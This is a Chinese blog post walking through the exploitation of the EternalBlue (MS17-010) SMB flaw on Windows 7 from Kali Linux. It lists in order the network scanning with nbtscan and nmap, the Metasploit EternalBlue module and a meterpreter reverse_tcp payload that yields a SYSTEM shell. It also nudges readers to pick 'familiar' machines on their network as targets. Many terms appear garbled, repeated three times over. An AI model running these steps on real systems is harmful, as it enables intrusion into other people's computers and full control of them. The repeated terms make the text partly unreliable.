利用“永恒之蓝”漏洞进行Win7渗透的演示

2020-11-15 随笔

本文仅供演示与讲解，因为滥用此漏洞而造成他人财产损失,本人一概不负责任。

“永恒之蓝” 漏洞，于数年前被黑客组织 “影子经纪人” 曝出，随后也催生了 WannacryWannacryWannacry 勒索病毒等。微软已经在 ms17−010ms17-010ms17−010 补丁中修复了这个漏洞。Win7Win7Win7 是这个漏洞的重灾区（当然之前的 XP,VistaXP,VistaXP,Vista 等也有这个漏洞）。Win10Win10Win10 已经修复了这个漏洞，Win7Win7Win7 要开防火墙并且装补丁，SP1SP1SP1 和 SP2SP2SP2 都一样。

这个漏洞利用的是 445445445 端口，是 WindowsWindowsWindows 的 smbsmbsmb 功能中的漏洞。

话不多说，我们现在来复现这个漏洞。

准备工作：kalikalikali linuxlinuxlinux 一台（可以是虚拟机），Win7Win7Win7 一台（也可以是虚拟机，注意要关闭防火墙和杀软的）。注意两台机器要连到同一个网络。

第一步：打开终端，输入 ifconfig 。可以看到第二行有一个“ inet 192.168.0.115 ”，这是 kalikalikali 的内网 ipipip ，记录下它。

第二步：执行 sudo nbtscan -r kali的ip/24 ，注意把 kali的ip 换成上一步您得到的内网 ipipip ，得到以下结果（结果因人而异）。这是这个网络下的所有计算机，看看有没有你熟悉的名字呢。找到你要渗透的那台 Win7Win7Win7 ，记录下 IPIPIP。（当然你知道对方的内网 ipipip 就可以跳过这一步）。我们这次来渗透“ERIC−PCERIC-PCERIC−PC”。它的内网 IPIPIP 是 192.168.0.116192.168.0.116192.168.0.116 。

第三步：输入 nmap -sS -sV -Pn Win7的ip ，注意把 “ Win7Win7Win7的ipipip ” 换成上一步您得到的 Win7Win7Win7 内网 IPIPIP，得到以下结果。注意此操作要等待一段时间。最终报告中可以看到 445445445 端口是 openopenopen 的，说明很大概率是能够攻击成功的。

第四步：输入 msfconsole 。启动需要几秒。每次启动图案都不一样，不用担心。显示 "msf5msf5msf5" 或 "msf6msf6msf6" 等则表明启动成功。

第五步：输入 use auxiliary/scanner/smb/smb_ms17_010

第六步：输入 set RHOSTS win7的ip

第七步：输入 run ，出现 Host is likely vulnerable to MS17-010 即表示基本是可以入侵成功的。

第八步：输入 use exploit/windows/smb/ms17_010_eternalblue

第九步：输入 set RHOST win7的ip ，输入 set LHOST kali的ip ，输入 set payload windows/x64/meterpreter/reverse_tcp 。

第十步：输入 run

最后，出现 =======WIN======= 即表示成功入侵。输入 shell 进入 WindowsWindowsWindows 命令行。然后我们就可以”为所欲为“。（此时我们获得的是SYSTEM权限，比管理员权限还高哦！)
